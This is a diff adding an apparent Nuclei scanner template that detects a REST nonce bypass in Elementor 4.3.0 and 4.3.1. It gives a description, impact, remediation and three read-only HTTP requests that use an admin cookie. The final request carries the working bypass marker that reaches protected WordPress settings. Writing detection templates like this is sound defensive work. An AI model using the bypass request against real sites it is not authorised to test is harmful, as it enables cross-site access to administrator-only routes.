@@ -1,0 +1,58 @@
+id: elementor-rest-nonce-bypass
+
+info:
+  name: Elementor 4.3.0 - 4.3.1 - REST Nonce Bypass
+  author: alex700
+  severity: medium
+  description: |
+    Elementor's Editor Events REST authentication filter in versions 4.3.0 and 4.3.1 trusts an events-route marker anywhere in the request URI. With an authenticated WordPress administrator cookie, a crafted query marker can bypass the REST nonce check for a separate protected route. This read-only check compares denied baseline and near-miss requests with access to WordPress settings using the exact marker.
+  impact: |
+    A cross-site request using an administrator's browser session can reach protected REST routes without the required nonce, subject to the route's capability checks and browser cookie policy.
+  remediation: |
+    Update Elementor to 4.3.2 or later.
+  reference:
+    - https://patchstack.com/articles/cross-site-request-forgery-in-elementor-plugin-affecting-2-million-sites/
+  metadata:
+    max-request: 3
+    vendor: elementor
+    product: elementor
+    framework: wordpress
+  tags: wordpress,wp,wp-plugin,elementor,csrf,auth-bypass
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - raw:
+      - |
+        GET /?rest_route=/wp/v2/settings HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{token}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 401 && contains(body, "rest_forbidden")'
+        internal: true
+
+  - raw:
+      - |
+        GET /?rest_route=/wp/v2/settings&elementor/v1/eventz/ HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{token}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 401 && contains(body, "rest_forbidden")'
+        internal: true
+
+  - raw:
+      - |
+        GET /?rest_route=/wp/v2/settings&elementor/v1/events/ HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{token}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(content_type, "application/json") && contains_all(body, "\"title\"", "\"email\"", "\"timezone\"")'
